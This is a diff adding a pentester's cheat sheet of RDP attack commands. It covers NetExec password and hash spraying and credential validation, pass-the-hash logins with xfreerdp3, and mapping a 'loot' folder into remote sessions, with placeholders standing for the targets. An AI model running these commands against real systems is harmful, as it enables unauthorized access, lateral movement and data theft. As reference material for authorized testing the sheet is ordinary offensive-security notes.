@@ -1,0 +1,51 @@
+% rdp, ad, shell
+
+; --- NetExec rdp (check / spray) ---
+# Banner + NLA mode
+nxc rdp <ip>
+
+# Validate password
+nxc rdp <ip> -u <user> -p '<pass>'
+
+# Validate against domain
+nxc rdp <ip> -u <user> -p '<pass>' -d <domain>
+
+# Pass-the-hash (restricted-admin / PtH if allowed)
+nxc rdp <ip> -u <user> -H <nthash>
+
+# Local (non-domain) account
+nxc rdp <ip> -u <user> -p '<pass>' --local-auth
+
+# Pre-auth login screenshot (no creds)
+nxc rdp <ip> --screenshot --screentime 5 --screenshot-path .
+
+# Check NLA requirement
+nxc rdp <ip> -u '' -p ''
+
+# Password spray a user list
+nxc rdp <ip> -u users.txt -p '<pass>' -d <domain> --continue-on-success
+
+# User list x password list
+nxc rdp <ip> -u users.txt -p passwords.txt -d <domain> --continue-on-success
+
+# Hash spray
+nxc rdp <ip> -u users.txt -H hashes.txt --continue-on-success
+
+; --- connect (xfreerdp3 / rdesktop) ---
+# Password auth (local account)
+xfreerdp3 /v:<ip> /u:<user> /p:'<pass>' +clipboard /dynamic-resolution /cert:ignore
+
+# Domain auth
+xfreerdp3 /v:<ip> /d:<domain> /u:<user> /p:'<pass>' +clipboard /dynamic-resolution /cert:ignore
+
+# Prompt for password (no plaintext in history)
+xfreerdp3 /v:<ip> /u:<user> +clipboard /dynamic-resolution /cert:ignore
+
+# Pass-the-hash (restricted admin mode)
+xfreerdp3 /v:<ip> /u:<user> /pth:<nthash> +clipboard /cert:ignore
+
+# Share a local folder into the session
+xfreerdp3 /v:<ip> /u:<user> /p:'<pass>' /drive:loot,<loot> +clipboard /cert:ignore
+
+# rdesktop fallback
+rdesktop -u <user> -p '<pass>' -d <domain> -g 1440x900 <ip>
